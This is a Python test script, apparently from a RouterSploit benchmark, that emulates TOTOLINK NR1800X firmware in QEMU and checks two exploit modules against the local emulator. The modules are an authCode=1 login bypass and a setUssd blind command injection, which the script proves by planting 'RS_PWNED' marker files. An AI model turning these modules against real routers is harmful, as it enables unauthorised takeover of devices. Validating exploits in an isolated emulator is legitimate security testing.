#!/usr/bin/env python3
"""R171: NR1800X 栈 bring-up + RouterSploit 模块真实固件测试 (WSL 内运行)

前置: scripts/emu_test.sh 已启动 QEMU (hostfwd 8091->80) 与 http.server 8000 (/tmp/totolink.tar.gz)
"""
import os

# 关键: WSL 有 http_proxy=127.0.0.1:7890, no_proxy 的 "127.*" 通配不被 curl/requests 识别,
# 对 127.0.0.1:8091 的请求会被代理吃掉返回 502。必须先剥离代理环境。
for _k in ("http_proxy", "https_proxy", "HTTP_PROXY", "HTTPS_PROXY", "all_proxy", "ALL_PROXY"):
    os.environ.pop(_k, None)
os.environ["no_proxy"] = "127.0.0.1,localhost"
os.environ["NO_PROXY"] = "127.0.0.1,localhost"

import socket as sk
import sys
import time
import types

PORT = 8091


class Cons:
    def __init__(self):
        for _ in range(40):
            try:
                self.s = sk.socket(sk.AF_UNIX, sk.SOCK_STREAM)
                self.s.settimeout(8)
                self.s.connect("/tmp/to_console")
                return
            except Exception:
                time.sleep(5)
        raise RuntimeError("to_console unreachable")

    def drain(self, w=2.0):
        self.s.settimeout(w)
        buf = b""
        try:
            while True:
                c = self.s.recv(4096)
                if not c:
                    break
                buf += c
        except sk.timeout:
            pass
        return buf

    def expect_login(self):
        # 已开机的 guest: login 提示在连接前就已打印, 必须主动发 \n 让 getty 重显提示
        for _ in range(60):
            self.s.sendall(b"\n")
            d = self.drain(4)
            if b"login:" in d:
                self.s.sendall(b"root\n")
                time.sleep(1)
                self.drain(3)
                self.s.sendall(b"root\n")
                time.sleep(3)
                return True
            if b"#" in d:  # 已经是 root shell
                return True
        return False

    def run(self, cmd, w=20):
        # 注意 r164 经验: 命令以 & 结尾时不可再拼 ; echo (语法错静默吞), 故不加 tag 后缀
        self.drain(0.3)
        self.s.sendall(cmd.encode() + b"\n")
        time.sleep(w)
        return self.drain(4).decode(errors="replace")


def alive():
    """裸 socket 探测 (绕开一切代理/curl 环境问题)"""
    try:
        s = sk.create_connection(("127.0.0.1", PORT), timeout=5)
        s.sendall(b"GET / HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n")
        s.settimeout(5)
        data = s.recv(2048)
        s.close()
        return data.split(b"\r\n")[0].decode(errors="replace")
    except Exception as e:
        return "ERR:{}".format(type(e).__name__)


print("[*] waiting for guest boot...", flush=True)
c = Cons()
print("[+] login:", c.expect_login(), flush=True)

if "200" not in alive():
    # E2: 网络 + 取固件 (r164 原序)
    c.run("for i in 1 2 3 4 5 6 7 8; do ifconfig eth0 10.0.2.15 up 2>/dev/null && break; sleep 5; done; route add default gw 10.0.2.2 2>/dev/null; rm -f /root/fw.tgz; wget -q http://10.0.2.2:8000/totolink.tar.gz -O /root/fw.tgz", w=90)
    print("[wget]:", c.run("wc -c /root/fw.tgz", w=4).strip().replace("\n", " | ")[-60:], flush=True)
    # E3: 解压 — tarball 根目录是 squashfs-root/, 必须 mv
    print("[unpack]:", c.run("cd /root && rm -rf sq && tar xzf fw.tgz && mv squashfs-root sq && ls sq/usr/sbin/lighttpd sq/www/cgi-bin/cstecgi.cgi", w=120).strip().replace("\n", " ")[-80:], flush=True)
    c.run("cd /root/sq && mount -o bind /dev ./dev 2>/dev/null; mount -t proc proc ./proc 2>/dev/null; mkdir -p var/run tmp; ln -sfn /lighttp lighttpd 2>/dev/null", w=8)
    # E4: lighttpd (r164 验证过的原句)
    c.run("setsid chroot /root/sq /bin/sh -c 'touch /var/run/lighttpd.pid; exec /usr/sbin/lighttpd -f /lighttp/lighttpd.conf -D' > /root/lt.log 2>&1 < /dev/null &", w=8)
    time.sleep(6)
    if "200" not in alive():
        print("[lt.log]:", c.run("tail -5 /root/lt.log", w=4).strip()[-200:], flush=True)
print("[web]:", alive(), flush=True)

if "200" not in alive():
    print("WEB_FAILED: stack not ready")
    sys.exit(1)

print("\n===== RouterSploit 模块真实固件测试 =====\n", flush=True)

os.chdir("/mnt/d/CODE/benchmark/routersploit")
sys.path.insert(0, ".")
stub = types.ModuleType("pkg_resources")
stub.resource_filename = lambda pkg, fn: ""
stub.resource_string = lambda pkg, fn: b""
sys.modules["pkg_resources"] = stub

from routersploit.modules.exploits.routers.totolink.nr1800x_login_bypass import Exploit as LoginBypass  # noqa: E402
from routersploit.modules.exploits.routers.totolink.nr1800x_setussd_rce import Exploit as SetUssdRCE  # noqa: E402

# Test 1: authCode=1 登录绕过
print("TEST 1: nr1800x_login_bypass (authCode=1 -> SESSION_ID)", flush=True)
e = LoginBypass()
e.target = "127.0.0.1"
e.port = PORT
r1 = e.check()
print("  check() =", r1, flush=True)
if r1:
    e.run()

# Test 2: setUssd 命令注入 (time-based check 在真实固件上生效)
print("\nTEST 2: nr1800x_setussd_rce (blind command injection, time-based check)", flush=True)
e2 = SetUssdRCE()
e2.target = "127.0.0.1"
e2.port = PORT
e2.username = "admin"
r2 = e2.check()
print("  check() =", r2, " (baseline vs sleep-5 delta > 4s)", flush=True)

# Test 3: 副作用 marker 3x 确定性验证 (铁证: HTTP 触发 + 控制台回读, 对齐 r164 3/3 口径)
print("\nTEST 3: marker side-effect x3 (blind injection console readback)", flush=True)
if r2:
    hits = 0
    for i in range(3):
        marker = "/tmp/RS_PWNED_{}".format(i)
        e2.execute("touch " + marker)
        time.sleep(2)
        out = c.run("ls /root/sq" + marker + " 2>&1", w=3)
        ok = marker.split("/")[-1] in out and "No such" not in out
        hits += 1 if ok else 0
        print("  round {}: {}".format(i + 1, "MARKER LANDED" if ok else "miss"), flush=True)
        c.run("rm -f /root/sq" + marker, w=1)
    print("  RESULT: {}/3 deterministic".format(hits), flush=True)
    print("\n===== EMULATION_TEST_{} =====".format("PASS" if hits == 3 else "PARTIAL"))
else:
    print("  SKIPPED (check failed)", flush=True)
    print("\n===== EMULATION_TEST_FAIL =====")
